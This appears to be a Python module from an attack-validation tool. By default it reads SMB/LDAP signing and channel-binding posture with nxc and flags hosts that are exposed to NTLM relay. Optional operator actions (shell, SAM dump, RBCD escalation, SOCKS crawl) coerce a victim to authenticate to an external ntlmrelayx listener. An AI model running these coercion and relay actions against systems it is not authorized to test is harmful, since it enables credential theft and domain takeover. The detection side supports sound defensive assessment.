"""SIGNING-RELAY validation executor -- SMB/LDAP signing-posture + relay/reflection
exposure (the control the 2025 NTLM-relay CVEs hinge on).

Signing enforcement is what collapses the whole NTLM relay/reflection class: a signing-
REQUIRED target rejects a relayed or reflected session. This READ-ONLY edge reads each
target's SMB signing + LDAP signing + channel binding (via ``nxc``) and CLASSIFIES its
relay exposure:

- **SMB signing NOT required** -> SMB relay + **CVE-2025-33073** reflection applicable
  (-> SYSTEM on an unpatched host).
- **LDAP signing NOT required / channel binding NOT enforced** -> LDAP relay applicable.
  (**CVE-2025-54918**'s *required-signing* bypass needs Server 2025; where signing is
  simply not required, ordinary relay already applies -- so the honest, provable finding
  is "this target does not enforce signing -> relayable".)

The default ``detect`` action reports WHICH targets lack/bypass signing (are relayable).
Operator actions (escalate/shell/crawl/dump) first check the required channel, then
dispatch coercion to an operator-run external ntlmrelayx listener. Dispatch never
asserts that the operator's requested action succeeded.
``exit 0 is never proof`` -- the signing posture parsed from the tool output decides, not
the return code. Non-mutating; no rollback. Secret-safe: operator creds are masked in every
stored argv; the receipt carries only public host posture facts.
"""
from __future__ import annotations

import re
from typing import Any

from .. import netresolve, proof, states
from ..recommend import ParamSpec, ParamValue, values
from .base import ValidationExecutor, ExecutorContext, StepRecord, redact_argv
from .ntlm_relay import (dispatch_external_coercion, external_dispatch_predicate,
                         external_listener_spec, external_relay_preview)


_RE_SMB_SIGNING = re.compile(r"\(signing:(True|False)\)", re.I)        # nxc smb
_RE_LDAP_SIGNING = re.compile(r"\(signing:(\w+)\)", re.I)              # nxc ldap (None|Required|...)
_RE_CHANNEL = re.compile(r"channel binding:([^)]+)", re.I)            # nxc ldap (Never|When Supported|Always)
RELAY_ACTIONS = ("detect", "escalate", "shell", "crawl", "dump")
ACTION_MODES = {"dump": "smb_sam", "escalate": "ldap_rbcd",
                "shell": "smb_exec", "crawl": "smb_socks"}


class SigningRelayExecutor(ValidationExecutor):
    technique = "SIGNING-RELAY"
    technique_class = "relay"
    terminal_kind = "relay_exposure"
    mutating = False
    verified_recipe = True        # PROVED on GOAD: braavos SMB signing off; DCs LDAP signing not required
    pre = frozenset({states.S0_USER_CREDS})
    recipe_ref = ("SIGNING-RELAY = nxc smb/ldap <host> -> parse SMB signing + LDAP signing + "
                  "channel binding -> classify relay/reflection exposure (CVE-2025-33073 / -54918 "
                  "surface); optional operator actions dispatch coercion to external ntlmrelayx")

    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        e = finding.entity or {}
        return [
            ParamSpec(name="action", kind="free", recommended="detect",
                      choices=list(RELAY_ACTIONS),
                      description="Detect signing posture, or dispatch an operator relay action "
                                  "against the first selected host after checking its channel.",
                      rationale="Read-only detection by default; action verbs require an external listener."),
            ParamSpec(name="hosts", kind="free",
                      description="Comma-separated hosts to assess SMB/LDAP signing posture on "
                                  "(defaults to the finding host + configured extra targets).",
                      recommended=e.get("hosts") or finding.host or "",
                      rationale="Scope of the signing-posture / relay-exposure assessment.",
                      required=False),
            external_listener_spec(),
            ParamSpec(name="coerce_victim", kind="free", recommended="", required=False,
                      description="Host to coerce; defaults to the selected exposed host.",
                      rationale="The coerced authentication feeds the operator's listener."),
            ParamSpec(name="shell_cmd", kind="free", recommended="", required=False,
                      description="Command for shell action guidance; empty uses ntlmrelayx -i.",
                      rationale="The operator's ntlmrelayx executes the command or serves an interactive shell."),
        ]

    def target_identity(self, ctx, finding, params) -> dict[str, Any]:
        if (values(params).get("action") or "detect") != "detect":
            hosts = self._hosts(ctx, finding, params)
            if hosts:
                return dict(ctx.config.resolve_target_identity(hosts[0]))
        host = finding.host or ""
        return dict(ctx.config.resolve_target_identity(host)) if host else dict(finding.entity)

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        action = v.get("action") or "detect"
        if action != "detect":
            hosts = self._hosts(ctx, finding, params)
            host = hosts[0] if hosts else "<host>"
            mode = ACTION_MODES[action]
            channel = "ldap_relay" if mode == "ldap_rbcd" else "smb_relay"
            return [f"nxc smb/ldap on selected hosts; require {channel} exposure on {host}",
                    *external_relay_preview(
                        ctx, host, mode, v.get("coerce_victim") or host,
                        v.get("external_listener") or "<ip>",
                        action=action, shell_cmd=v.get("shell_cmd") or "")]
        return ["nxc smb <host> -> SMB signing (required? else SMB relay / CVE-2025-33073 reflection)",
                "nxc ldap <host> -> LDAP signing + channel binding (not required? -> LDAP relay)",
                "classify per-host relay/reflection exposure (read-only; no coercion/relay fired)"]

    def _hosts(self, ctx, finding, params) -> list[str]:
        v = values(params)
        raw = (v.get("hosts") or "").strip()
        hosts = [h.strip() for h in raw.split(",") if h.strip()] if raw else []
        if not hosts and finding.host:
            hosts = [finding.host]
        for t in (getattr(ctx.config, "extra_targets", None) or []):
            if t and t not in hosts:
                hosts.append(t)
        return hosts

    def execute(self, ctx: ExecutorContext, finding, params) -> dict:
        cfg = ctx.config
        steps: list[StepRecord] = []
        errors: list[str] = []
        auth = netresolve.nxc_auth_flags(cfg)

        def rec(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        hosts = self._hosts(ctx, finding, params)
        if not hosts:
            errors.append("no_target_hosts")
            return self._artifact(steps, None, False, errors)

        per_host: list[dict] = []
        for host in hosts:
            h = {"host": host, "reachable": False, "smb_signing_required": None,
                 "ldap_signing_required": None, "channel_binding": None, "exposure": []}
            # --- SMB signing ---
            smb_argv = ["nxc", "smb", host, *auth]
            res = ctx.runner.run(smb_argv, timeout=cfg.tool_timeout_s)
            m = _RE_SMB_SIGNING.search(res.stdout or "")
            if m:
                h["reachable"] = True
                h["smb_signing_required"] = (m.group(1).lower() == "true")
                if h["smb_signing_required"] is False:
                    h["exposure"].append("smb_relay")       # NTLM relay + CVE-2025-33073 reflection
            rec("nxc_smb_signing", smb_argv, res,
                h["smb_signing_required"] is not None,
                note=f"{host}: smb signing={h['smb_signing_required']}")
            # --- LDAP signing + channel binding ---
            ldap_argv = ["nxc", "ldap", host, *auth, *netresolve.nxc_kerberos_flags(cfg)]
            res = ctx.runner.run(ldap_argv, timeout=cfg.tool_timeout_s)
            text = res.stdout or ""
            ms, mc = _RE_LDAP_SIGNING.search(text), _RE_CHANNEL.search(text)
            if ms:
                # Recognise EXPLICIT values only: nxc emits "Unknown" / "No TLS cert" on a
                # failed read, which must stay INCONCLUSIVE (None), never "not enforced".
                sval = ms.group(1).lower()
                if sval == "none":
                    h["ldap_signing_required"] = False      # explicitly not required
                elif sval in ("required", "enforced", "yes", "true"):
                    h["ldap_signing_required"] = True        # explicitly required
                else:
                    h["ldap_signing_required"] = None        # unknown/failed -> inconclusive
                cbv = (mc.group(1).strip().lower() if mc else None)
                h["channel_binding"] = cbv
                cb_bypassable = cbv in ("never", "when supported")       # EXPLICIT bypassable only
                # reachable only on a recognised LDAP reading (not a failed "Unknown").
                if h["ldap_signing_required"] is not None or cb_bypassable:
                    h["reachable"] = True
                # ldap_relay only on an EXPLICIT non-enforcement reading.
                if h["ldap_signing_required"] is False or cb_bypassable:
                    h["exposure"].append("ldap_relay")
            rec("nxc_ldap_signing", ldap_argv, res,
                h["ldap_signing_required"] is not None,
                note=f"{host}: ldap signing={h['ldap_signing_required']} cb={h['channel_binding']}")
            if not h["reachable"]:
                errors.append(f"unreachable:{host}")
            per_host.append(h)

        v = values(params)
        if (v.get("action") or "detect") != "detect":
            return self._relay_action(ctx, v, per_host, steps, errors)

        exposed = [h for h in per_host if h["exposure"]]
        ok = bool(exposed)
        classes = sorted({c for h in exposed for c in h["exposure"]})
        terminal = proof.build_terminal_fact(
            self.terminal_kind, ok=ok,
            predicate=(f"SMB/LDAP signing-posture assessment over {len(hosts)} host(s): "
                       + (f"{len(exposed)} relay-exposed ({', '.join(classes)}) -- "
                          f"signing not enforced on {', '.join(h['host'] for h in exposed)}"
                          if exposed else "all assessed hosts enforce signing")),
            proof_token=proof.proof_token("SIGNING-RELAY", cfg.domain,
                                          ",".join(sorted(hosts)),
                                          "exposed" if ok else "enforced"),
            extra={"per_host": per_host, "exposed_classes": classes,
                   "exposed_hosts": [h["host"] for h in exposed]},
        )
        return self._artifact(steps, terminal, ok, errors)

    def _relay_action(self, ctx, v, per_host, steps, errors):
        action = v["action"]
        mode = ACTION_MODES[action]
        selected = per_host[0]
        host = selected["host"]
        channel = "ldap_relay" if mode == "ldap_rbcd" else "smb_relay"
        endpoint = v.get("external_listener") or ""
        gate = {"classifier": "not_required", "op": None}
        if channel not in selected["exposure"]:
            classification = "not_relay_exposed"
            predicate = f"Selected host {host} is not relay-exposed for the required channel {channel}; no coercion dispatched"
        elif not endpoint:
            classification = "external_listener_required"
            predicate = ("Start ntlmrelayx on the operator listener as shown in steps_preview "
                         "and pass external_listener=<ip> to dispatch coercion")
        else:
            verdict = ctx.authorizer.authorize("relay", {"relay_target": host,
                                                        "mode": mode, "action": action})
            if verdict in ("approved", "denied"):
                gate = {"classifier": verdict, "op": "relay"}
            if verdict == "denied":
                artifact = self._artifact(steps, None, False, [*errors, "gate_denied:relay"])
                artifact["gate"] = gate
                return artifact
            dispatched_steps, classification = dispatch_external_coercion(
                ctx, v.get("coerce_victim") or host, endpoint)
            steps.extend(dispatched_steps)
            predicate = (external_dispatch_predicate(endpoint)
                         if classification == "coercion_dispatched_external"
                         else "coercion trigger timed out or failed to run")
        terminal = proof.build_terminal_fact(
            self.terminal_kind, ok=False, predicate=predicate,
            proof_token=proof.proof_token(self.technique, ctx.config.domain, host,
                                          action, classification),
            extra={"action": action, "mode": mode, "classification": classification,
                   "relay_target": host, "per_host": per_host})
        artifact = self._artifact(steps, terminal, False, [*errors, classification])
        artifact["gate"] = gate
        return artifact

    @staticmethod
    def _artifact(steps, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps],
                "gate": {"classifier": "not_required", "op": None},
                "mutation": {"applied": False,
                             "rollback": {"performed": False, "method": None, "verified": True}},
                "terminal_fact": terminal_fact, "complete": bool(complete), "errors": errors}
